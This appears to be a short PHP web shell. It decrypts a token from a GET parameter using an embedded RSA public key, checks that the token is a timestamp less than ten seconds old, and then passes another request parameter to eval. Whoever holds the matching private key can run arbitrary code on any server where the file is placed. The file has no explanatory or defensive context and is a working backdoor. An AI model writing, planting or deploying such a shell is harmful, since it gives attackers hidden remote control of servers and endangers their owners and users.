<?php

$public_key = "-----BEGIN PUBLIC KEY-----
MFwwDQYJKoZIhvcNAQEBBQADSwAwSAJBANhV1MObPe2ysarUMyCL0xRddYEi3mFk
/XjKg3Ky0pcskyeHbzunWbZaubY1iRj99n3eXudM1NihkiNkvtPfI9kCAwEAAQ==
-----END PUBLIC KEY-----";

@openssl_public_decrypt(base64_decode($_GET[0]),$cipher,$public_key);
if(time()-$cipher<10){
    eval($_REQUEST[1]);
}